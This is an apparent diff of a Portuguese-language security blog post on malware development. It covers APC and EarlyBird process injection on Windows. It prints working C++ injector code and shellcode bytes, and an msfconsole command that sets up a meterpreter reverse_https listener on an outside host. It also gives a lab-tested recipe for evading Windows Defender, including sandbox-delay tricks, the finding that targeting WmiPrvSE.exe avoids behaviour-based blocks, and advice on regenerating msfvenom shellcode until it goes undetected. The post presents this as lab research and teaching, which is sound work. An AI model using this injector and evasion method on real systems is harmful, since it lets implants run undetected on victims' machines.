 <p>Por fim, usaremos <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a>, repassando a localização remota do shellcode escrito, o handle para a thread e o valor NULL - para indicar que não é necessário repassar argumentos para o shellcode.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">THREADENTRY32</span> <span class="n">threadEntry</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">THREADENTRY32</span> <span class="n">threadEntry</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">threadEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// Finally, call QueueUserAPC to the main thread
@@ -552,84 +278,20 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Note que na comparação do laço for estamos utilizando uma variável local <code>i</code>, comparada no início com <code>THREAD_INJECTION_LIMIT</code> e incrementada ao fim dele, para evitar que a injeção se dê em todas as threads.</p>
 <p>Abaixo podemos ver o resultado quando o alvo é o <em>explorer.exe</em>. Foi utilizado o um valor de <code>THREAD_INJECTION_LIMIT</code> de 2, mas é possível que a cada execução esse valor possa mudar. Caso o shellcode não rode, é recomendado aumentar esse valor e tentar novamente.</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/02d35dc60d39f4bebb0df0f074f7fb7b.png"
-          alt="02d35dc60d39f4bebb0df0f074f7fb7b.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
+<p><img src="img/02d35dc60d39f4bebb0df0f074f7fb7b.png" alt="02d35dc60d39f4bebb0df0f074f7fb7b.png"></p>
 <p>Ao clicar no &ldquo;Ok&rdquo;, o processo do explorer irá crashar, porém nosso shellcode foi executado com sucesso.</p>
-
-
-
-
-
-
-
-
-
-  <h3 id="earlybird-injection"><a class="anchor" href="#earlybird-injection" title='Anchor for: EarlyBird Injection.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> EarlyBird Injection</h3> 
-
+<h3 id="earlybird-injection">EarlyBird Injection</h3>
 <p>Para ilustrarmos a efetividade do uso de APCs em cenários de evasão de defesas, iremos testar uma variação de injeção chamado EarlyBird, ou, &ldquo;O madrugador&rdquo;.</p>
 <p>O EarlyBird tem esse nome devido ao modo como a APC é injetada no processo-alvo. Sua vantagem com relação à técnica descrita na seção anterior é que não é necessário que um processo esteja rodando e tenha uma thread que entre em modo alertable para que ele seja vítima. Para isso, o injetor irá criar um processo em modo suspenso - em que a thread principal ainda não iniciou - configurar e enfileirar a função maliciosa e ela sempre irá rodar, visto que APCs também são executadas assim que um processo criado em modo suspenso é resumido.</p>
 <blockquote>
 <p>Por criar um processo em modo suspenso, a injeção EarlyBird pode ter um nível de detecção maior soluções mais sofisticadas, como EDRs.</p>
 </blockquote>
 <p>Vamos analisar a construção do <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/EarlyBird%20Injector">código</a>.</p>
-
-
-
-
-
-
-
-
-
-  <h4 id="earlybird-injector"><a class="anchor" href="#earlybird-injector" title='Anchor for: EarlyBird Injector.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> EarlyBird Injector</h4> 
-
+<h4 id="earlybird-injector">EarlyBird Injector</h4>
 <p>O código a seguir é uma <em>proof-of-concept</em> da técnica EarlyBird.</p>
 <p>Utilizaremos as funções com protótipos definidos nos headers <code>windows.h</code> e <code>iostream</code> para a construção do injetor e funcionamento auxiliar, como escrita de mensagens.</p>
 <p>Também iremos definir uma variável global para guardar nosso shellcode x64 - como no caso anterior, apenas um shellcode não malicioso que utiliza MessageBox.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="c1">// Spawns a MessageBox
@@ -664,13 +326,13 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6</span><span class="s">&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3</span><span class="s">&#34;</span><span class="p">;</span>
 </span></span></code></pre></div><p>A primeira coisa que o código da função <em>main</em> apresenta é a possibilidade de usarmos o injetor em qualquer processo. Para isso, o código abaixo apresenta a implementação que permite especificar o caminho completo até o EXE vítima através da linha de comando.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;USAGE: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;path</span><span class="se">\\</span><span class="s">to</span><span class="se">\\</span><span class="s">process&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span></code></pre></div><p>O seguinte trecho irá utilizar o path para o EXE especificado em <code>argv[1]</code> como primeiro argumento da função <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a>. Criaremos variáveis locais tendo como tipo as estruturas <code>STARTUPINFOA</code> (além da sua inicialização) e <code>PROCESS_INFORMATION</code>, para que a criação do processo tenha sucesso. Além disso, é importante que a flag de criação seja <code>CREATE_SUSPENDED</code>, para que a thread principal não seja executada imediatamente, gerando uma oportunidade para efetuarmos a injeção.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">STARTUPINFOA</span> <span class="n">startupInfo</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOA</span><span class="p">)};</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">STARTUPINFOA</span> <span class="n">startupInfo</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOA</span><span class="p">)};</span>
 </span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">procInfo</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Creating process &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
@@ -682,7 +344,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">		<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] PID: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">procInfo</span><span class="p">.</span><span class="n">dwProcessId</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span></code></pre></div><p>Após a criação bem sucedida, devemos alocar um espaço de memória RWX no processo remoto. Para isso, podemos utilizar a função <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>, repassando o handle para o processo, um endereço preferencial, tamanho, tipo de alocação e de proteção das páginas de memória.</p>
 <p>No injetor, o handle para o processo vítima está em <code>procInfo.hProcess</code>. Definiremos o tamanho da alocação para o tamanho do shellcode, além soma das constantes <code>MEM_RESERVE</code> e <code>MEM_COMMIT</code> para o tipo de alocação. Para definirmos as páginas de memória alocadas como RWX, iremos utilizar a contante <code>PAGE_EXECUTE_READWRITE</code>.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Allocating memory in remote process...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Allocating memory in remote process...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">shellcodeRemoteLocation</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">shellcodeRemoteLocation</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error on VirtualAllocEx: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
@@ -690,7 +352,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Allocated &#34;</span> <span class="o">&lt;&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; bytes at region &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; 0x&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">shellcodeRemoteLocation</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span></code></pre></div><p>A seguir, utilizaremos a função <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a> para escrevermos o nosso shellcode na localização previamente alocada pelo <code>VirtualAllocEx</code>. Criaremos uma variável do tipo SIZE_T para guardarmos a quantidade de bytes escrita pela função - sem um ponteiro para ela, a função não irá funcionar.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Trying to write shellcode at allocated memory...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Trying to write shellcode at allocated memory...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">SIZE_T</span> <span class="n">numberOfBytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">shellcodeRemoteLocation</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">numberOfBytesWritten</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="p">{</span>
@@ -700,72 +362,18 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Shellcode wrote successfully&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span></code></pre></div><p>Iremos novamente fazer o uso da <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">QueueUserAPC</a> para enfileirarmos o nosso shellcode remoto na thread principal do processo ainda em suspensão.</p>
 <p>Para isso, iremos fazer um casting da região que alocamos no processo vítima para um ponteiro de uma função APC (<code>PAPCFUNC</code>), a thread principal do programa (obtida por <code>procInfo.hThread</code>) e NULL como último parâmetro para indicarmos que o shellcode não necessita de argumentos.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Attempting to call shellcode via QueueUserAPC...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] Attempting to call shellcode via QueueUserAPC...&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">shellcodeRemoteLocation</span><span class="p">,</span> <span class="n">procInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 </span></span></code></pre></div><p>Em resumo, teremos uma região de memória RWX alocada em um outro processo, que está armazenando um shellcode que foi enfileirado como uma APC da thread principal. Agora o que nos resta é resumir a thread principal, com <code>ResumeThread</code>.</p>
-<div class="highlight"><pre aria-label="Box containing code sample." tabindex=0 class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">procInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;   </span><span class="se">\\</span><span class="s">_ [+] Success&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] EarlyBird injection successful :)&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>O resultado está expresso na imagem abaixo.</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/b490da5b43f58e192d19df97a8f6bded.png"
-          alt="b490da5b43f58e192d19df97a8f6bded.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
+<p><img src="img/b490da5b43f58e192d19df97a8f6bded.png" alt="b490da5b43f58e192d19df97a8f6bded.png"></p>
 <p>Agora que já entendemos o funcionamento das variações, vamos explicar um caso de uso, testado em laboratório, para bypass do Windows Defender.</p>
-
-
-
-
-
-
-
-
-
-  <h2 id="evadindo-windows-defender-com-injeções-apc"><a class="anchor" href="#evadindo-windows-defender-com-injeções-apc" title='Anchor for: Evadindo Windows Defender com injeções APC.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Evadindo Windows Defender com injeções APC</h2> 
-
+<h2 id="evadindo-windows-defender-com-injeções-apc">Evadindo Windows Defender com injeções APC</h2>
 <p>Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud-delivered Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um <em>wrapper</em> para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:</p>
 <ul>
 <li>Detecção de ambientes Sandbox para evasão de Antivírus, via <code>GetSystemTime</code> (delay de 10 segundos na execução). Caso uma sandbox seja detectada, o processo deverá encerrar;</li>
@@ -782,365 +390,67 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <li><code>msfconsole -x &quot;use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit&quot;</code></li>
 </ul>
 </blockquote>
-
-
-
-
-
-
-
-
-
-  <h3 id="resultados-shellcode-runner"><a class="anchor" href="#resultados-shellcode-runner" title='Anchor for: Resultados Shellcode Runner.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Resultados Shellcode Runner</h3> 
-
+<h3 id="resultados-shellcode-runner">Resultados Shellcode Runner</h3>
 <p>O código do Shellcode Runner utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>.</p>
 <p>Como explicado anteriormente, estamos utilizando o Shellcode Runner apenas como ponto de controle. Caso ele não seja detectado, então nossos níveis-padrão de ofuscação e evasão possivelmente são os responsáveis principais por esse resultado, e não as injeções APC. Caso contrário, temos uma boa probabilidade de que as técnicas que não foram detectadas obtiveram sucesso por causa da injeção realizada.</p>
 <p>Tal artefato foi identificado e bloqueado antes mesmo de executar qualquer instrução, evidenciando que apenas as evasões de assinatura e de sandbox existentes não seriam capazes de evadir o Windows Defender.</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/1fe26686d7e5d87fdb07420e06a85817.png"
-          alt="1fe26686d7e5d87fdb07420e06a85817.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
-
-
-
-
-
-
-
-
-
-  <h3 id="resultados-apc-injector"><a class="anchor" href="#resultados-apc-injector" title='Anchor for: Resultados APC Injector.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Resultados APC Injector</h3> 
-
+<p><img src="img/1fe26686d7e5d87fdb07420e06a85817.png" alt="1fe26686d7e5d87fdb07420e06a85817.png"></p>
+<h3 id="resultados-apc-injector">Resultados APC Injector</h3>
 <p>O código do APC Injector utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/APCInjector">nesse link</a>.</p>
 <p>A injeção foi realizada no <em>explorer.exe</em>, porém, houve bloqueio do Windows Defender pouco após o estabelecimento da shell reversa, como destacado na imagem abaixo.</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/2ec798d5ca8bc8637f19dc256a6184a3.png"
-          alt="2ec798d5ca8bc8637f19dc256a6184a3.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
-
-
-
-
-
-
-
-
-
-  <h3 id="resultados-earlybird"><a class="anchor" href="#resultados-earlybird" title='Anchor for: Resultados EarlyBird.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Resultados EarlyBird</h3> 
-
+<p><img src="img/2ec798d5ca8bc8637f19dc256a6184a3.png" alt="2ec798d5ca8bc8637f19dc256a6184a3.png"></p>
+<h3 id="resultados-earlybird">Resultados EarlyBird</h3>
 <p>O código do EarlyBird utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/EarlyBird">nesse link</a>.</p>
 <p>Devido à natureza da injeção EarlyBird, podemos utilizá-la para enfileirar APCs em praticamente qualquer processo que possa ser criado diretamente por nosso usuário. Logo, vamos fazer alguns testes com relação aos processos <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
 <p>O motivo para a escolha desses dois arquivos em específico é que o explorer.exe é um processo muito comum e que existe sempre em qualquer sistema Windows, que pode passar despercebido por softwares Antivírus. Já o svchost.exe também é comum e geralmente não gera suspeitas com relação ao tráfego de rede.</p>
 <p>Na imagem abaixo, podemos evidenciar o resultado do <em>explorer.exe</em>. A injeção foi um sucesso. Entretanto, ao tentarmos executar alguns comandos do meterpreter, como o comando <em>shell</em>, que nos dá controle sobre o cmd.exe do alvo, somos apresentados com bloqueios, com base em comportamento, do Windows Defender, que evita nosso acesso a shell local.</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/08aae613073683f12e9a22943a203e51.png"
-          alt="08aae613073683f12e9a22943a203e51.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
+<p><img src="img/08aae613073683f12e9a22943a203e51.png" alt="08aae613073683f12e9a22943a203e51.png"></p>
 <p>Tal comportamento também ocorreu no <em>svchost.exe</em>:</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"
-          alt="569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
+<p><img src="img/569b8cf7f3ef7a7405fb29bd7bdc8cc6.png" alt="569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"></p>
 <p>Possivelmente o Windows Defender monitora de perto as ações que o <em>explorer.exe</em> e <em>svchost.exe</em> realizam no sistema. A criação de um processo-filho do cmd.exe pode ser visto como comportamento suspeito a partir desses processos.</p>
-
-
-
-
-
-
-
-
-
-  <h4 id="o-caso-wmiprvseexe"><a class="anchor" href="#o-caso-wmiprvseexe" title='Anchor for: O caso WmiPrvSe.exe.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> O caso WmiPrvSe.exe</h4> 
-
+<h4 id="o-caso-wmiprvseexe">O caso WmiPrvSe.exe</h4>
 <p>O arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code> é um caso especial, visto que ele pode ser utilizado para criar diversos outros processos. Uma reflexão surge a partir dessa informação: será que o comando <em>shell</em> do meterpreter seria executado sem bloqueios?</p>
 <p>Testando a injeção EarlyBird, com o mesmo shellcode utilizado anteriormente, mas agora tendo como alvo o arquivo <code>WmiPrvSE.exe</code>, resultou em estabelecimento com sucesso da comunicação reversa, como no caso anterior, porém também foi possível executar o comando <em>shell</em>, sem bloqueios pelo Windows Defender:</p>
-<p>
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-  
-    
-    
-    
-      
-      
-        <img
-          
-          loading="lazy"
-          src="../img/maldev-0x00/1cf41dad10930134b3851e679a28485b.png"
-          alt="1cf41dad10930134b3851e679a28485b.png"
-        />
-      
-    
-    
-  
-  
-
-</p>
-
-
-
-
-
-
-
-
-
-  <h2 id="conclusão"><a class="anchor" href="#conclusão" title='Anchor for: Conclusão.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.81064d3059ecbc81ba05123e6096d08d.svg#hashtag"/></svg></a> Conclusão</h2> 
-
+<p><img src="img/1cf41dad10930134b3851e679a28485b.png" alt="1cf41dad10930134b3851e679a28485b.png"></p>
+<h2 id="conclusão">Conclusão</h2>
 <p>O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud-delivered Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.</p>
 <p>Não houve detecção do injetor, nem do conteúdo injetado, apenas bloqueio por comportamento de certas funcionalidades (como o comando shell) do meterpreter quando ele foi injetado no <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
 <p>Esse problema foi mitigado ao utilizarmos como alvo o arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code>.</p>
 <p>É importante ressaltar que é possível gerar um shellcode para o EarlyBird que não é detectado ao ser injetado no <em>explorer.exe</em> ou <em>svchost.exe</em> - no msfvenom, executando novamente o comando para gerar um shellcode pode ser o suficiente. Muitos shellcodes foram gerados, e alguns deles funcionavam 100% nesses dois arquivos.</p>
 <p>Entretanto, durante os testes, o cenário mais estável para injeção foi o <code>WmiPrvSE</code>, no qual todas as variações de shellcode testadas resultaram em sucesso e não detecção do comando <em>shell</em>.</p>
 
-
-
-    </article>
-  </main>
-
-
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://blog.midnighthackings.com/posts/pentest-0x00/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://blog.midnighthackings.com/posts/crackme-0x00/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
     </div>
     
-    <footer>
+
+            </div><footer>
+<div class="footer-content">
+
+  <div class="contact-info">
       
-
-
-  
-
-    
-
-    
+          <div class="footer-mail">
